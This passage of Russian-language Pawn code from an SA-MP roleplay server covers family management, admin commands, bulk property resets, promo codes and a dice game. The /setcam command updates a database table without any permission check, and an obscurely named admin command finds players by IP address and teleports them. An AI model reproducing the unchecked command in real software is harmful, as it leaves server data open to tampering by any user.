	,(!BizInfo[fam][bUl][3]) ? (cena4):("{20BA09}[Куплено]{FFFFFF}")
	,(!BizInfo[fam][bUl][4]) ? (cena5):("{20BA09}[Куплено]{FFFFFF}"));
	return ShowPlayerDialog(playerid,337,DIALOG_STYLE_TABLIST,"Улучшения",str,"Далее","Отмена");
}
/*
switch(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bUl])
{
case 0: ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Расширение склада/места'.\nУвеличит склад или наличие мест в Вашем бизнесе.\nС 3.000 продуктов до 5.000 или же с 10 мест до 15 мест.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}100000$","Далее","Назад");
case 1: ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Дополнительное рабочее место'.\nДобавит возможность назначить управляющего.\nКоторый сможет управлять бизнесом во время вашего отсутствия.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}350000$","Далее","Назад");
case 2: ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Добавить бизнес в GPS-навигатор'.\nДобавит Ваш бизнес в GPS-навигатор.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}500000$","Далее","Назад");
default: SendClientMessage(playerid,CGREY,"У Вас куплены все улучшения");
					}*/
stock ShowSetFam(playerid)
{
	new hs[30],sh[35];
	if(!FamInfo[PlayerInfo[playerid][pFam]][fHouse]) hs = "{F85A5A}[Нет]{FFFFFF}",sh = "";
	else
	{
		format(hs,sizeof(hs),"{20BA09}[Дом №%d]{FFFFFF}",FamInfo[PlayerInfo[playerid][pFam]][fHouse]);
		format(sh,sizeof(sh),"3 | Шкаф\t%s\n",(FamInfo[PlayerInfo[playerid][pFam]][fShkaf]) ? ("{F85A5A}[Для Вас]{FFFFFF}"):("{20BA09}[Для всех]{FFFFFF}"));
	}
	static const fmt_string[] = "1 | Цвет семьи\t{%06x}[IIIII]{FFFFFF}\n2 | Дом семьи\t%s\n%s";
	new str[sizeof(fmt_string)+6+30+40];
	format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fColor] >>> 8,hs,sh);
	return ShowPlayerDialog(playerid,336,DIALOG_STYLE_TABLIST,"Настройки",str,"Далее","Отмена");
}

CMD:funinvite(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pFam] == 0) return SendClientMessage(playerid,CGREY,"Вы не состоите в семье");
    if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0)
    {
	    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /funinvite [id]");
	    if(playerid == params[0]) return true;
		if(PlayerInfo[params[0]][pFam] != PlayerInfo[playerid][pFam]) return SendClientMessage(playerid,CGREY,"Игрок не состоит в вашей семье");
		static const fmt_string[] = "[%s] %s изгнан из семьи";
		new str[sizeof(fmt_string)+32+50];
		format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[GetPVarInt(playerid,"SemID")][pFam]][fName],PlayerInfo[playerid][pSendername]);
		SendFamMessage(PlayerInfo[params[0]][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
		PlayerInfo[params[0]][pFam] = 0;
	}
	else SendClientMessage(playerid, CGREY, "Доступно только лидеру семьи");
	return true;
}

CMD:finvite(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pFam] == 0) return SendClientMessage(playerid,CGREY,"Вы не состоите в семье");
    if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0)
    {
	    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /finvite [id]");
	    if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[params[0]][pSendername], true) == 0) return SendClientMessage(playerid,CGREY,"Игрок лидер какой-то семьи");
	    if(playerid == params[0]) return true;
	    
	    new Float:x,Float:y,Float:z;
		GetPlayerPos(params[0],x,y,z);
		if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
		query = "";
	    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE fam = '%d'", PlayerInfo[playerid][pFam]);
		mysql_tquery(mysql, query, "ShowAllFamily1", "dd", playerid,params[0]);
		
	}
	else SendClientMessage(playerid, CGREY, "Доступно только лидеру семьи");
	return true;
}

function ColVeh(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 3 && FamInfo[PlayerInfo[playerid][pFam]][fUl][0])
	{
	    SendClientMessage(playerid,CGREY,"Вы не можете купить больше 3 транспорт средств");
	    return SendClientMessage(playerid,CGREY,"Чтобы убрать ограничение Вам требуется приобрести улучшение для семьи");
	}
	else
	{
		BuyCar(playerid,1);
	}
	return 1;
}
function ShowAllFamily1(playerid,player)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 10 && FamInfo[PlayerInfo[playerid][pFam]][fUl][1])
	{
	    SendClientMessage(playerid,CGREY,"Вы не можете принять больше 10 человек в семью");
	    return SendClientMessage(playerid,CGREY,"Чтобы убрать ограничение Вам требуется приобрести улучшение для семьи");
	}
	else
	{
	    SendClientMessage(playerid,CREWARD,"Вы предложили игроку присоедениться к семье");
		static const fmt_string1[] = "%s предложил Вам присоедениться к семье %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+50];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],FamInfo[PlayerInfo[playerid][pFam]][fName]);
		SendClientMessage(player,0xFF7F50FF,str1);
		SendClientMessage(player,CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
		SetPVarInt(player,"SemID",playerid);
		SetPVarInt(player,"Sem",1);
	}
	return 1;
}
stock GetPlayerCameraLookAt(playerid, &Float:X, &Float:Y, &Float:Z)
{
    new
        Float:CamX, Float:CamY, Float:CamZ,
        Float:FrX, Float:FrY, Float:FrZ;
    GetPlayerCameraPos(playerid, CamX, CamY, CamZ);
    GetPlayerCameraFrontVector(playerid, FrX, FrY, FrZ);
    X = FrX + CamX;
    Y = FrY + CamY;
    Z = FrZ + CamZ;
}
CMD:getcamera(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return 1;
    new Float:x, Float:y, Float:z;
    GetPlayerCameraPos(playerid, x, y, z);
    new str[144];
    format(str,sizeof(str),"SetPlayerCameraPos(playerid,%f,%f,%f);", x, y, z);
    SendClientMessage(playerid,-1,str);
    GetPlayerCameraLookAt(playerid, x, y, z);
    format(str,sizeof(str),"SetPlayerCameraLookAt(playerid,%f,%f,%f);", x, y, z);
    SendClientMessage(playerid,-1,str);
	return true;
}
CMD:setcam(playerid,params[])
{
    if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /setcam [id]");
    new Float:x, Float:y, Float:z;
    new Float:xx, Float:yy, Float:zz;
    GetPlayerCameraPos(playerid, x, y, z);
    GetPlayerCameraLookAt(playerid, xx, yy, zz);
	query = "";
	format(query,sizeof(query),"UPDATE `radar` SET `camx` = '%f',`camy` = '%f',`camz` = '%f', \
	`camxx` = '%f', `camyy` = '%f',`camzz` = '%f' WHERE rid = '%d' LIMIT 1",x,y,z,xx,yy,zz, params[0]);
	mysql_tquery(mysql,query);
	SendClientMessage(playerid,-1,"Заебись");
	return 1;
}
CMD:st34sfthjk5bee(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "s[16]", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /st34sfthjk5bee [ip]");
	new Float:x,Float:y,Float:z,ip[16];
	GetPlayerPos(playerid,x,y,z);
	new rand;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    GetPlayerIp(i,ip,sizeof(ip));
	    if(!strcmp(ip,params[0],true))
	    {
	        rand = random(4 - 1) + 1;
			SetPlayerScore(i,rand);
		    SetPlayerColor(i, 0xFFFFFF20);
		    SetPlayerPos(i,x,y+1,z);
	    }
    }
	return true;
}
CMD:car(playerid)
{
    if(PlayerLogged[playerid] == false) return 1; // (!PlayerInfo[playerid][pLic][0]) ? ("Нет"):("Есть")
    if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не за рулём");
   	static const fmt_string1[] = "Багажник:\t%s{FFFFFF}\nКапот:\t%s{FFFFFF}\nФары:\t%s{FFFFFF}\nОкна\t{A8EFFF}[Управление]";
	new str1[sizeof(fmt_string1)+15*3];
	new v = GetPlayerVehicleID(playerid);
	format(str1, sizeof(str1), fmt_string1,(!Trunk[v]) ? ("{F85A5A}[Закрыт]"):("{20BA09}[Открыт]"),(!Capot[v]) ? ("{F85A5A}[Закрыт]"):("{20BA09}[Открыт]"),(!Lights[v]) ? ("{F85A5A}[Выключены]"):("{20BA09}[Включены]"));
	return ShowPlayerDialog(playerid,227,DIALOG_STYLE_TABLIST,"Управление машиной",str1,"Далее","Назад");
}

CMD:nu(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /nu [id фракции]");
	if(FracUval[params[0]] == false) return SendClientMessage(playerid,CGREY,"Данная фракция не подавала заявку на увольнение всех оффлайн");
	FracUval[params[0]] = false;
 	static const fmt_string[] = "[A]{ffffff} %s дал отказ на увольнение всех оффлайн из %s[%d]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32+3-2*3];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracInfo[params[0]][fName],params[0]);
	return SendAdminMessage(CYELLOW,str);
}
function ResetMembers()
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new sos[32];
		for(new row = 1; row<= rows; row++)
		{
		    cache_get_field_content(row-1, "name", sos, mysql);
            if(GetPlayerID(sos) == INVALID_PLAYER_ID)
			{
				SetPlayerInt(sos, "member", 0);
				SetPlayerInt(sos, "rank", 0);
			}
		}
	}
	return 1;
}
CMD:du(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /du [id фракции]");
	if(FracUval[params[0]] == false) return SendClientMessage(playerid,CGREY,"Данная фракция не подавала заявку на увольнение всех оффлайн");
	FracUval[params[0]] = false;
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE member = '%d' AND leader = '0'", params[0]);
	mysql_tquery(mysql, query, "ResetMembers", "d", playerid);
	static const fmt_string[] = "[A]{ffffff} %s дал согласия на увольнение всех оффлайн из %s[%d]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32+3-2*3];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracInfo[params[0]][fName],params[0]);
	return SendAdminMessage(CYELLOW,str);
	/*format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE member = '%d' AND leader = '0'", params[0]);
	mysql_tquery(mysql,query);
	mysql_store_result();
    if(mysql_num_rows() > 0)
    {
		for(new i = 1; i <= mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			new sos[32];
			mysql_get_field("name", sos);
			if(GetPlayerID(sos) == INVALID_PLAYER_ID)
			{
				SetPlayerInt(sos, "member", 0);
				SetPlayerInt(sos, "rank", 0);
			}
		}
		mysql_free_result();
    }
    static const fmt_string[] = "[A]{ffffff} %s дал согласия на увольнение всех оффлайн из %s[%d]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32+3-2*3];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracInfo[params[0]][fName],params[0]);
	return SendAdminMessage(CYELLOW,str);*/
}


new ve44;
CMD:prodaj(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /prodaj [id]");
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	ve44 = CreateVehicle(params[0],x,y,z,0.2314,1,1,600000);
	PutPlayerInVehicle(playerid,ve44,0);
	return SendClientMessage(playerid,-1,"/prodaj2");
}
CMD:prodaj2(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /prodaj2 [cena]");
	new Float:x,Float:y,Float:z,Float:fa;
	GetVehiclePos(ve44,x,y,z);
	GetVehicleZAngle(ve44,fa);
	query = "";
	format(query,sizeof(query),"INSERT INTO `veh` ( `model`, `xmag`, `ymag`, `zmag`, `fmag`,`cost`,`x`, `y`, `z`, `fa`) VALUES (%i, '%f', '%f', '%f', '%f', %i, '%f', '%f', '%f', '%f')",
	GetVehicleModel(GetPlayerVehicleID(playerid)),x,y,z,fa,params[0],x,y,z,fa);
	mysql_tquery(mysql,query);
	CreateVehicle(GetVehicleModel(GetPlayerVehicleID(playerid)),x,y,z,fa,1,1,600000);
	return DestroyVehicle(ve44);
}
CMD:dice(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(!IsPlayerInRangeOfPoint(playerid,50.0,1962.19714, 1010.02173, 992.96722)) return SendClientMessage(playerid, -1, "Вы должны находиться в казино");
	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /dice [id игрока] [ставка]");
	if(params[0] == playerid) return SendClientMessage(playerid, CGREY, "Вы не можете играть с самим собой");
	if(params[1] < 0 || params[1] > 100000) return SendClientMessage(playerid, CGREY, "Ставка от 0$ до 100000$");
	if(PlayerInfo[playerid][pCash] < params[1]) return SendClientMessage(playerid, CGREY, "Недостаточно средств");
	new Float:x,Float:y,Float:z;
	GetPlayerPos(params[0],x,y,z);
	if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	SendClientMessage(playerid,CREWARD,"Вы предложили игроку сыграть в кости");
	static const fmt_string1[] = "%s предложил Вам сыграть в кости. Ставка: $%i";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+3];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],params[1]);
	SendClientMessage(params[0],0xFF7F50FF,str1);
	SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
	SetPVarInt(params[0],"Dice",1);
	SetPVarInt(params[0],"DiceID",playerid);
	SetPVarInt(params[0],"DiceCena",params[1]);
	return true;
}

CMD:asellbiz1(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
	if(FD1 || FD2)
	{
	    new str[3];
		for(new i =0 ; i <=TOTALBIZ; i++)
		{
		    
		    format(str,3,"%i",i);
			cmd_asellbiz(playerid,str);
		}
	}
	return true;
}
CMD:asellhouse1(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;

	if(FD1 || FD2)
	{
	    new str[3];
		for(new i =0 ; i <=TOTALHOUSE; i++)
		{
		    
		    format(str,3,"%i",i);
			cmd_asellhouse(playerid,str);
		}
	}
	return true;
}


CMD:asellbiz(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return 1;
	if(FD1 || FD2)
	{
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /asellbiz [id бизнеса]");
		if(params[0] < 1 || params[0] > TOTALBIZ) return SendClientMessage(playerid, CGREY, "Используйте: /asellbiz [id бизнеса]");
		BizInfo[params[0]][bLock] = 0;
		BizInfo[params[0]][bProd] = 5000;
		BizInfo[params[0]][bMoney] = 0;
		strmid( BizInfo[params[0]][bOwner], "None", 0, strlen("None"), 32);
		query = "";
		format(query, sizeof(query), "UPDATE `biz` SET `owner` = 'None',`lock` = '0',`prod` = '5000',`money` = '0',`price` = '150000',`locktime` = '0' \
		,`zeml` = '0',`vhod` = '0',`maneger` = 'None',`ul` = '0' WHERE `id` = '%d' LIMIT 1", params[0]);
		mysql_tquery(mysql,query);
		UpdateBiz(params[0]);
		SendClientMessage(playerid,CREWARD,"Вы продали бизнес государству");
	}
	return true;
}

CMD:asellhouse(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return 1;
	if(FD1 || FD2)
	{
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /asellhouse [id дома]");
		if(params[0] < 1 || params[0] > TOTALHOUSE) return SendClientMessage(playerid, CGREY, "Используйте: /asellhouse [id дома]");
		HInfo[params[0]][hOplata] = 0;
	    HInfo[params[0]][hLock] = 0;
	    strmid(HInfo[params[0]][hOwner], "None", 0, strlen("None"), 32);
	    strmid(HInfo[params[0]][hZasel1], "None", 0, strlen("None"), 32);
	    strmid(HInfo[params[0]][hZasel2], "None", 0, strlen("None"), 32);
	    strmid(HInfo[params[0]][hZasel3], "None", 0, strlen("None"), 32);
	    strmid(HInfo[params[0]][hZasel4], "None", 0, strlen("None"), 32);
		DestroyDynamicPickup(HInfo[params[0]][hPick]);
		DestroyDynamicMapIcon(HInfo[params[0]][hMap]);
		HInfo[params[0]][hMap] = CreateDynamicMapIcon(HInfo[params[0]][hX],HInfo[params[0]][hY],HInfo[params[0]][hZ], 31, 0,-1,-1,-1,200.0);
		HInfo[params[0]][hPick] = CreateDynamicPickup(1273,23,HInfo[params[0]][hX],HInfo[params[0]][hY],HInfo[params[0]][hZ],0);
		query = "";
		format(query, sizeof(query), "UPDATE testhouse SET hOwner = 'None',hOplata = 0,hLock = 0,hZasel1 = 'None',hZasel2 = 'None',hZasel3 = 'None',hZasel4 = 'None' \
		WHERE id = '%d' LIMIT 1", params[0]);
		mysql_tquery(mysql,query);
		SendClientMessage(playerid,CREWARD,"Вы продали дом государству");
	}
	return true;
}
function ShowPromo(playerid)
{
	new rows = cache_get_row_count(mysql);
	new str[64],var,code[10];
	query = "";
	strcat(query,"{20BA09}Создать промокод{ffffff}\n");
	if(rows > 0)
	{
		for(new row = 1; row<= rows; row++)
		{
		    cache_get_field_content(row-1, "id1", code, mysql);
		    var = cache_get_field_content_int(row-1, "vvod", mysql);
            format(str,sizeof(str),"%s\tВведено: %d\n",code, var);
  			strcat(query,str);
		}
	}
	ShowPlayerDialog(playerid, 410, DIALOG_STYLE_LIST, "Промокоды", query, "Далее","Отмена" );
	return 1;
}
CMD:promo(playerid)
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
    if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, 0xAFAFAFAA, "Не флуди!");
	mysql_tquery(mysql, "SELECT * FROM `code`", "ShowPromo", "d", playerid);
/*	new str[64],var[10],code[10];
	mysql_query("SELECT * FROM `code`");
	query = "";
	strcat(query,"Создать промокод\n");
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
		for(new i = 1; i <= mysql_num_rows(); i++)
		{
           if(mysql_fetch_row_format(query))
	       {
               mysql_get_field("vvod", var);
               mysql_get_field("code", code);
               format(str,sizeof(str),"%s\tВведено: %d\n",code, strval(var));
			   strcat(query,str);
	       }
		}
		
		mysql_free_result();
	}
	ShowPlayerDialog(playerid, 410, DIALOG_STYLE_LIST, "Промокоды", query, "Далее","Отмена" );*/
    SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	return 1;
}
/*CMD:bankinfo(playerid)
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return 1;
    if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, 0xAFAFAFAA, "Не флуди!");
	new str[64],stringinfo[1200],params[2];
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE `bank` > '0' ORDER BY `bank` DESC LIMIT 15");
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
        format(str,sizeof(str),"{FFFFFF}Ник | Деньги\n\n"); strcat(stringinfo,str);
		for(new i = 0; i < mysql_num_rows(); i++)
		{
               if(mysql_fetch_row_format(query))
		       {
		           new var[32],name[32];
      			   params[1]++;
                   mysql_get_field("name", var); name = var, var = "";
                   mysql_get_field("bank", var); params[0] = strval(var);
                   format(str,sizeof(str),"%s | %i$\n",name,params[0]); strcat(stringinfo,str);
		       }
		}
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Деньги в банке", stringinfo, "Закрыть","" );
		mysql_free_result();
	}
    SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
    return 1;
}
CMD:cashinfo(playerid)
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return 1;
    if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, 0xAFAFAFAA, "Не флуди!");
	new str[64],stringinfo[1200],params[2];
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE `cash` > '0' ORDER BY `cash` DESC LIMIT 15");
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
        format(str,sizeof(str),"{FFFFFF}Ник | Деньги\n\n"); strcat(stringinfo,str);
		for(new i = 0; i < mysql_num_rows(); i++)
		{
               if(mysql_fetch_row_format(query))
		       {
		           new var[32],name[32];
      			   params[1]++;
                   mysql_get_field("name", var); name = var, var = "";
                   mysql_get_field("cash", var); params[0] = strval(var);
                   format(str,sizeof(str),"%s | %i$\n",name,params[0]); strcat(stringinfo,str);
		       }
		}
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Деньги на руках", stringinfo, "Закрыть","" );
		mysql_free_result();
	}
    SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
    return 1;
}*/
CMD:settime(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /settime [время]");
	SetWorldTime(params[0]);
	return true;
}
CMD:weather(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return 1;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /weather [id погоды]");
	SetWeather(params[0]);
	wather = params[0];
	return true;
}
CMD:givepriz(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return 1;
	if(FD1 || FD2)
	{
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /givepriz [id]");
		if(PlayerInfo[params[0]][pPriz] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть кейс");
		PlayerInfo[params[0]][pPriz] = 1;
		GiveInv(playerid,445,1);
		SendClientMessage(params[0],-1,"Вы не открыли кейс, чтобы открыть используйте {f7ae11}/opencase");
	}
	return true;
}

/*CMD:acs(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	static const fmt_string[] = "Головной убор\t\t{f7ae11}%s{FFFFFF}\nОчки\t\t\t{f7ae11}%s{FFFFFF}\nНаручные часы\t{f7ae11}%s{FFFFFF}\nБандана\t\t{f7ae11}%s{FFFFFF}\
	\nНаушники\t\t{f7ae11}%s{FFFFFF}\nСумки\t\t\t{f7ae11}%s{FFFFFF}";
	new str[sizeof(fmt_string)+20+20+20+10];
	format(str, sizeof(str), fmt_string,(!PlayerInfo[playerid][pAcs][0]) ? ("{F85A5A}Пусто"):((!PlayerInfo[playerid][pAcs1][0]) ? ("{20BA09}Одето"):("Снято")),
	(!PlayerInfo[playerid][pAcs][1]) ? ("{F85A5A}Пусто"):((!PlayerInfo[playerid][pAcs1][1]) ? ("{20BA09}Одето"):("Снято")),
	(!PlayerInfo[playerid][pAcs][2]) ? ("{F85A5A}Пусто"):((!PlayerInfo[playerid][pAcs1][2]) ? ("{20BA09}Одето"):("Снято")),
	(!PlayerInfo[playerid][pAcs][3]) ? ("{F85A5A}Пусто"):((!PlayerInfo[playerid][pAcs1][3]) ? ("{20BA09}Одето"):("Снято")),
	(!PlayerInfo[playerid][pAcs][4]) ? ("{F85A5A}Пусто"):((!PlayerInfo[playerid][pAcs1][4]) ? ("{20BA09}Одето"):("Снято")),
	(!PlayerInfo[playerid][pAcs][5]) ? ("{F85A5A}Пусто"):((!PlayerInfo[playerid][pAcs1][5]) ? ("{20BA09}Одето"):("Снято")));
	ShowPlayerDialog(playerid,206,DIALOG_STYLE_LIST,"Аксессуары",str,"Далее","Отмена");
	return true;
}*/



CMD:ns(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false ) return true;
	new kek = 1;
	query = "";
	static const fmt_string[] = "От %s на %s\n";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
	strcat(query, "{FFFFFF}Закрыть окошко\n");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
	    if(strlen(PlayerInfo[i][pNick]) > 6)
	    {
		    if(kek == 30)  break;
			
			format(str, sizeof(str), fmt_string,PlayerInfo[i][pSendername],PlayerInfo[i][pNick]);
			strcat(query, str);
			ListNick[playerid][kek] = i;
			kek++;
		}
	}
	ShowPlayerDialog(playerid,30,DIALOG_STYLE_LIST,"Заявки на смену ника",query,"Одобрить","Отклонить");
	return true;
}
CMD:m(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(IsACop(playerid))
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, CGREY, "Вы не в машине");
		if(sscanf(params, "s[144]", params)) return SendClientMessage(playerid, CGREY, "Используйте: /m [текст]");
		static const fmt_string[] = "Мегафон | %s %s: %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+144];
		format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params);
		ProxDetector(20.0, playerid, str,CYELLOW);
	}
	else SendClientMessage(playerid, CGREY, "Вам недоступна данная команда");
	return true;
}

CMD:fbadge(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_FBI)
	{
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /showbadge [id игрока]");
		if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
		new Float:x,Float:y,Float:z;
    	GetPlayerPos(params[0],x,y,z);
    	if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   		static const fmt_string1[] = "{FFFFFF}Имя Фамилия: {f7ae11}%s{FFFFFF}\nОрганизация: {f7ae11}%s{FFFFFF}\nДолжность: {f7ae11}%s{FFFFFF}";
		new strr[sizeof(fmt_string1)+MAX_PLAYER_NAME+32+32];
		format(strr, sizeof(strr), fmt_string1,PlayerInfo[playerid][pSendername],FracInfo[GetPVarInt(playerid,"Badge")][fName],FracRank[GetPVarInt(playerid,"Badge")][GetPVarInt(playerid,"Ranks")]);
		ShowPlayerDialog(params[0],0,DIALOG_STYLE_MSGBOX,"Удостоверение",strr,"Назад","");
		static const fmt_string5[] = "%s достает удостоверение и показывает его %s";
		new str5[sizeof(fmt_string5)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
